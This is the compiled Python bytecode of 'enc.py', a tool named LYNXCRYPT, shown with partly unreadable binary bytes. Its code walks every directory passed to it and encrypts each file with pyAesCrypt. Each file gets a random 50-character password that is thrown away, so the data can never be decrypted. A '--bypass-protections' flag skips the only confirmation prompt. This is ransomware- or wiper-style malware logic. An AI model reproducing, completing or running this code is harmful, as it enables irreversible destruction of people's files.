o
    �#�d  �                   @   sv   d dl Z d dlZd dlZd dlZd dlZd dlZdd� Zdd� Zdd� Zdd	� Z	d
d� Z
dd� Zedkr9e�  dS dS )�    Nc                   C   s    t �  t� rt�  d S t�  d S �N)�	printLogo�	checkProt�startEnc�exit� r   r   �enc.py�mainDef   s   

r	   c                   C   s   t t�d�� d S )NZ	LYNXCRYPT)�print�pyfigletZfiglet_formatr   r   r   r   r      s   r   c                   C   s:   dt jv rtd� dS td�dkrtd� dS td� dS )	N�--bypass-protectionszPAll the protections have been disabled.
The encryption process will start now.

Tz\The protections are enabled.
To start the encryption process, you have to confirm typing Y: �Yz(The encryption process will start now.

zThe program will exit now.

F)�sys�argvr
   �inputr   r   r   r   r      s   
r   c                  C   s8   g } t jD ]}|dkr| �|� q| D ]}t|� qd S )Nr   )r   r   �append�encFiles)Z	dirsToEnc�argZdirToEncr   r   r   r   "   s   

�
�r   c                 C   s~   t �| �D ]7}t j�| |�}t j�|�rt|� q|d }zt�||td�d� t	|d � W q   t	d| d � Y qd S )Nz
.lynxcrypt�2   i   z has been encrypted.
zFailed to encrypt z. Passing to the next file.
)
�os�listdir�path�join�isdirr   �
pyAesCryptZencryptFile�genPasswr
   )ZencDirZencFileZencFilePathZencAlrFilePathr   r   r   r   -   s   
�r   c                    s2   t jt j t j � d�� fdd�t| �D ��}|S )N� c                 3   s   � | ]}t �� �V  qd S r   )�random�choice)�.0�_�ZpassCharr   r   �	<genexpr>?   s   � zgenPassw.<locals>.<genexpr>)�string�ascii_letters�digitsZpunctuationr   �range)ZpassLenZpassStrr   r!   r   r   =   s   r   �__main__)r   r   r   r   r   r#   r	   r   r   r   r   r   �__name__r   r   r   r   �<module>   s    
�